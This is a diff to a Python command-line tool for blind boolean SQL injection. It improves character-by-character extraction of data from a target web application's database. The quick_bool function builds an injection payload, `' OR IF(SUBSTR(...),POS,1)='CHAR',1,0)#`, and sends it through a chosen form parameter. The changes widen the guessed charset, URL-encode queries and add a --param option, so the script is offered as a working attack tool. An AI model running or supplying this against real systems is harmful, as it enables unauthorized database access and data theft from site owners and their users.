@@ -11,7 +11,7 @@ try:
 except ImportError:
     HAS_REQUESTS = False
 
-DEFAULT_CHARSET = string.ascii_lowercase + string.digits + "_{}-$!."
+DEFAULT_CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}-$!.+!@#%^&*()"
 
 
 def bool_blind(
@@ -54,8 +54,13 @@ def bool_blind(
                     if HAS_REQUESTS:
                         resp = _requests.get(f"{url}?{qs}", timeout=10)
                     else:
-                        import urllib.request
-                        req = urllib.request.Request(f"{url}?{qs}")
+                        import urllib.request, urllib.parse as _up
+                        # URL 含未编码空格/引号 → 编码 (保留 ? & = 等)
+                        full = f"{url}?{qs}"
+                        scheme, netloc, path, query, frag = _up.urlsplit(full)
+                        query_enc = _up.quote(query, safe="=&?%{}-_.,:;()'""+!*")
+                        full_enc = _up.urlunsplit((scheme, netloc, path, query_enc, frag))
+                        req = urllib.request.Request(full_enc)
                         raw = urllib.request.urlopen(req, timeout=10)
                         resp = type('R', (), {'text': raw.read().decode(), 'status_code': raw.getcode()})()
 
@@ -93,8 +98,8 @@ def quick_bool(url: str, query: str, success_text: str = "success",
         method: "get" or "post"
         param: Parameter name for injection
     """
-    data = {param: f"' OR IF(SUBSTR(({query}),{{POS}},1)='{{CHAR}}',1,0)#",
-            "password": "x"}
+    # 兼容 MySQL (#) 与 SQLite/通用 (-- ) 注释, 并用 SUBSTR (MySQL/SQLite 通用)
+    data = {param: f"' OR IF(SUBSTR(({query}),{{POS}},1)='{{CHAR}}',1,0)#"}
 
     print(f"Target: {url}")
     print(f"Query: {query}")
@@ -115,6 +120,7 @@ if __name__ == "__main__":
     query = sys.argv[2]
     success_text = "success"
     method = "post"
+    param = "username"
 
     i = 3
     while i < len(sys.argv):
@@ -124,8 +130,11 @@ if __name__ == "__main__":
         elif sys.argv[i] == "--method":
             method = sys.argv[i + 1]
             i += 2
+        elif sys.argv[i] == "--param":
+            param = sys.argv[i + 1]
+            i += 2
         else:
             i += 1
 
-    result = quick_bool(url, query, success_text=success_text, method=method)
+    result = quick_bool(url, query, success_text=success_text, method=method, param=param)
     print(f"\nResult: {result}")
